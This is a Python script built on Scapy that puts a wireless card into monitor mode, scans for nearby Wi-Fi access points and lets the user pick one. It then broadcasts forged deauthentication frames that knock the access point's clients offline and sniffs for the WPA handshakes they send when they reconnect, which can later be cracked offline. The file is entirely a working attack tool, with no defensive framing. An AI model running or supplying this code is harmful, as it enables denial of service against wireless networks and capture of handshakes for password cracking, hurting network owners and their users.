import os
import time
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth
from scapy.layers.eap import EAPOL

# Global variables
aps = {}  # Dictionary to hold detected APs
scanning_for_aps = True  # Flag to control scanning for APs

def handle_packet_for_detection(packet):
    """Handles packets for AP detection phase, focusing on beacon frames."""
    global aps
    if not scanning_for_aps:
        return  # Skip processing if scanning is disabled

    if packet.haslayer(Dot11Beacon):
        bssid = packet[Dot11].addr2
        ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore') if packet[Dot11Elt].info else 'Hidden SSID'
        channel = next((elt.info[0] for elt in packet[Dot11Elt].iterpayloads() if elt.ID == 3), None)

        if bssid and (bssid not in aps or aps[bssid].get('channel') != channel):
            aps[bssid] = {'ssid': ssid, 'channel': channel}
            print(f"AP Detected: SSID={ssid}, BSSID={bssid}, Channel={channel}")

def handle_packet_for_eapol(packet):
    """Detects EAPOL frames which are potential handshakes."""
    if packet.haslayer(EAPOL):
        print("*** EAPOL frame detected, potential handshake! ***")

def send_deauth(iface, ap_mac, channel):
    """Sends deauthentication packets to disrupt AP-client communications."""
    global scanning_for_aps
    scanning_for_aps = False
    try:
        subprocess.run(["sudo", "iwconfig", iface, "channel", str(channel)], check=True)
        pkt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=ap_mac, addr3=ap_mac, type=0, subtype=12) / Dot11Deauth(reason=7)
        print(f"Sending deauth packets to {ap_mac} on channel {channel}...")
        sendp(pkt, iface=iface, count=64, inter=0.1, verbose=False)
    finally:
        scanning_for_aps = True  # Resume scanning

def set_monitor_mode(interface):
    """Configures the interface to monitor mode."""
    try:
        os.system(f"sudo ifconfig {interface} down")
        os.system(f"sudo iwconfig {interface} mode monitor")
        os.system(f"sudo ifconfig {interface} up")
        print(f"{interface} set to monitor mode.")
    except Exception as e:
        print(f"Failed to set monitor mode on {interface}: {str(e)}")
        sys.exit(1)

def main():
    interface = "wlx24050fe36984"
    set_monitor_mode(interface)
    print("Scanning for APs... Please wait.")
    try:
        sniff(iface=interface, prn=handle_packet_for_detection, timeout=30)
    except Exception as e:
        print(f"Error during sniffing: {str(e)}")
        return

    print("\nDetected access points:")
    for idx, (bssid, details) in enumerate(aps.items()):
        print(f"{idx}: {details['ssid']} [{bssid}] - Channel: {details['channel']}")

    try:
        index = int(input("Enter the index of the AP you want to deauth: "))
        target_ap = list(aps.keys())[index]
        send_deauth(interface, target_ap, aps[target_ap]['channel'])
    except IndexError:
        print("Invalid AP index.")
        return
    except ValueError:
        print("Invalid input. Please enter a number.")
        return

    print("Monitoring for handshakes...")
    try:
        sniff(iface=interface, prn=handle_packet_for_eapol, timeout=60)
    except Exception as e:
        print(f"Error during sniffing for handshakes: {str(e)}")
    print("Stopping network monitoring.")

if __name__ == "__main__":
    main()
